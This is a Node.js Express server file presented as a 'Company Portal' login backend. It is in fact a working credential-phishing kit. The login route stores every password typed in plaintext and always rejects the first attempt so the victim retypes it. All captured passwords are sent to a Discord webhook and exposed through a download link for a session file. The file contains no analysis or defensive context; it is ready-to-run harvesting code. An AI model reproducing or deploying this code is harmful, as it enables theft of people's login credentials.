// ===============================
// ✅ Company Portal — Server.js
// ===============================
import express from "express";
import bodyParser from "body-parser";
import cookieParser from "cookie-parser";
import path from "path";
import fs from "fs";
import fetch from "node-fetch"; // install this: npm i node-fetch

const app = express();
const PORT = process.env.PORT || 4000;
const __dirname = path.resolve();

app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, "public")));

const SESSIONS_DIR = path.join(__dirname, "sessions");
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);

// Track login attempts and passwords
const userAttempts = {}; // { username: { count, passwords: [] } }

// ------------------ Discord Webhook ------------------
async function sendToDiscord(username, passwords, status, token) {
  const webhook = process.env.DISCORD_WEBHOOK_URL;
  if (!webhook) {
    console.log("⚠️ Discord webhook not configured (add in environment variables).");
    return;
  }

  const msg = {
    username: "Portal Logger",
    embeds: [
      {
        title: "🧠 New Login Submission",
        color: status === "Success" ? 0x2ecc71 : 0xe74c3c,
        fields: [
          { name: "Username", value: username, inline: false },
          { name: "Password Attempts", value: passwords.join("\n"), inline: false },
          { name: "Status", value: status, inline: true },
          { name: "Time", value: new Date().toLocaleString(), inline: true },
          ...(token
            ? [{ name: "Session File", value: `[Download JSON](https://${process.env.RENDER_EXTERNAL_HOSTNAME}/download/${token})`, inline: false }]
            : [])
        ]
      }
    ]
  };

  try {
    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(msg)
    });
    console.log(`📤 Sent login info for ${username} to Discord`);
  } catch (err) {
    console.error("❌ Discord Webhook Error:", err);
  }
}

// ------------------ Session Creation ------------------
function createSessionFile(username) {
  const token = Math.random().toString(36).substring(2) + Date.now().toString(36);
  const filePath = path.join(SESSIONS_DIR, `session_${token}.json`);
  const sessionData = {
    username,
    attempts: userAttempts[username]?.passwords || [],
    token,
    created: new Date().toISOString(),
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString()
  };
  fs.writeFileSync(filePath, JSON.stringify(sessionData, null, 2));
  console.log(`🗂 Session created → ${filePath}`);
  return token;
}

// ------------------ LOGIN ------------------
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!userAttempts[username]) {
    userAttempts[username] = { count: 0, passwords: [] };
  }

  userAttempts[username].count++;
  userAttempts[username].passwords.push(password);

  console.log(`🔐 Attempt ${userAttempts[username].count} for ${username} → "${password}"`);

  // First attempt always rejected
  if (userAttempts[username].count < 2) {
    await sendToDiscord(username, userAttempts[username].passwords, "Rejected");
    return res.status(401).send("Incorrect password. Please try again.");
  }

  // Second attempt accepted
  const token = createSessionFile(username);
  res.cookie("session_id", token, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });

  await sendToDiscord(username, userAttempts[username].passwords, "Success", token);
  console.log(`✅ Login successful for ${username}`);
  res.status(200).json({ message: "Login successful", token });
});

// ------------------ SESSION FILE DOWNLOAD ------------------
app.get("/download/:token", (req, res) => {
  const token = req.params.token;
  const filePath = path.join(SESSIONS_DIR, `session_${token}.json`);
  if (fs.existsSync(filePath)) {
    res.download(filePath, `session_${token}.json`);
  } else {
    res.status(404).send("Session not found.");
  }
});

// ------------------ DASHBOARD ------------------
app.get("/dashboard.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public/dashboard.html"));
});

// ------------------ START SERVER ------------------
app.listen(PORT, () => console.log(`✅ Running on http://localhost:${PORT}`));
